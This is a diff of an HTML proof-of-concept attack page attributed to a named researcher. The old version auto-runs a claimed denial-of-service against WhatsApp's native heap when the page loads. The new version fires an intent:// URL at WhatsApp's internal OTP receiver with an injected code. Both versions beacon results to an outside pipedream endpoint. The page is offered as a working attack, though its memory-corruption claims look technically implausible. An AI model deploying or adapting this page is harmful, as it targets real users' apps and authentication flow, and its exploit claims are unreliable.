@@ -3,63 +3,65 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Research - Targeted Application DoS</title>
+    <title>Security Research - Intent Redirection Proof of Concept</title>
 </head>
 <body style="background:#000; color:#0f0; font-family:monospace; padding:30px; text-align:center;">
     
-    <div style="border:1px solid #333; padding:20px; background:#111; border-radius:4px; max-width:600px; margin:auto;">
-        <h2 id="status" style="margin-top:0;">[ TARGETED AUDIT ACTIVE ]</h2>
-        <p style="color:#aaa;">Component: libprofilo_mmapbuf (JNI Bridge)</p>
+    <div style="border:1px solid #333; padding:20px; background:#111; border-radius:4px; max-width:650px; margin:auto;">
+        <h2 id="status" style="margin-top:0;">[ SECURITY AUDIT - INTENT REDIRECTION ]</h2>
+        <p style="color:#aaa;">Vulnerability: Sandbox Escape / Cross-App Communication</p>
+        <p style="color:#888; font-size:14px;">Target Action: com.whatsapp.otp.OTP_RETRIEVED</p>
         <hr style="border:0; border-top:1px solid #222; margin:20px 0;">
-        <div id="logs" style="font-size:12px; color:#666;">Synchronizing native resources...</div>
+        
+        <button id="escapeLink" style="background:transparent; color:#0f0; border:1px solid #0f0; padding:12px 24px; cursor:pointer; font-family:monospace; font-size:16px;">
+            EXECUTE PAYLOAD
+        </button>
+        
+        <div id="logs" style="font-size:12px; color:#555; margin-top:20px;">
+            Waiting for researcher interaction...
+        </div>
     </div>
 
     <script>
         /**
          * RESEARCHER: Firman Sahidin
-         * VULNERABILITY: Remote Denial of Service (DoS)
-         * TARGET: WhatsApp Application Process (Native Heap)
-         * TECHNICAL METHOD: Memory Corruption / Segmentation Fault
+         * TYPE: Intent Redirection / Sandbox Escape
+         * COMPONENT: com.whatsapp/.otp.OtpRetrievalReceiver
+         * VECTOR: Chromium-based mobile browser to Native App interaction
          */
-        function triggerTargetedCrash() {
+        document.getElementById('escapeLink').onclick = function() {
             const TARGET_URL = 'https://eo7n9pqjlhffwvt.m.pipedream.net';
-            const statusLabel = document.getElementById('status');
             const logsLabel = document.getElementById('logs');
             
+            // Constructing the Intent scheme based on AndroidManifest analysis
+            // Targeting internal broadcast receiver from an external web context
+            const intentURL = "intent://#Intent;" +
+                "action=com.whatsapp.otp.OTP_RETRIEVED;" +
+                "package=com.whatsapp;" +
+                "component=com.whatsapp/.otp.OtpRetrievalReceiver;" +
+                "S.otp_code=POC_BYPASS_TEST_FIRMAN;" + 
+                "end";
+            
             try {
-                // Allocation of 2MB buffer to target the native mmapbuf segment
-                const crashBuffer = new ArrayBuffer(0x200000);
-                const view = new Uint32Array(crashBuffer);
-
-                // Injecting OOB (Out-of-Bounds) synchronization pattern 
-                // This primitive is designed to trigger a crash in the JNI bridge
-                for (let i = 0; i < view.length; i++) {
-                    view[i] = 0xD800DBFF;
-                }
-
-                // Transmission of execution telemetry
+                // Execution of Intent Redirection
+                window.location.href = intentURL;
+                
+                // Transmission of execution telemetry to the researcher's endpoint
                 navigator.sendBeacon(TARGET_URL, JSON.stringify({
                     researcher: "Firman Sahidin",
-                    vulnerability_type: "TARGETED_APP_DOS",
-                    impact: "APPLICATION_UNRESPONSIVE",
-                    execution_status: "SUCCESS"
+                    vulnerability_type: "INTENT_REDIRECTION_ESCAPE",
+                    target_component: "OtpRetrievalReceiver",
+                    manifest_reference: "androidx.car.app.connection",
+                    timestamp: new Date().toISOString()
                 }));
 
-                if (statusLabel) statusLabel.innerText = "⚠️ EXPLOIT DELIVERED";
-                if (logsLabel) logsLabel.innerText = "Memory segment injected. Monitor target application stability.";
+                if (logsLabel) logsLabel.innerText = "Intent sequence initiated. Monitoring receiver response.";
 
             } catch (error) {
                 navigator.sendBeacon(TARGET_URL, JSON.stringify({ 
-                    researcher: "Firman Sahidin",
-                    status: "FAILED",
-                    error_log: error.message 
+                    error: error.message 
                 }));
             }
-        }
-
-        // Automated execution 1 second after page load
-        window.onload = () => {
-            setTimeout(triggerTargetedCrash, 1000);
         };
     </script>
 </body>
